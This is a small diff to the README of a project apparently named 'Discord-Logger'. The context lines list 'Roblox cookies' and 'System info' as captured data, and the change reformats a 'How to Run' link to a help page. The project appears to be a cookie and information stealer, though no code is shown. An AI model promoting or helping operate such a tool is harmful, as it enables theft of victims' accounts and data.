@@ -22,5 +22,5 @@ Roblox cookies:\
 System info:\
 ![Alt text](discord-logger-images/discord3.png?raw=true)\
 # How to Run:
-Go to ["https://github.com/TurtlesXD/Discord-Logger/blob/main/discord-logger-help/Help.md"]
+Go to https://github.com/TurtlesXD/Discord-Logger/blob/main/discord-logger-help/Help.md
 
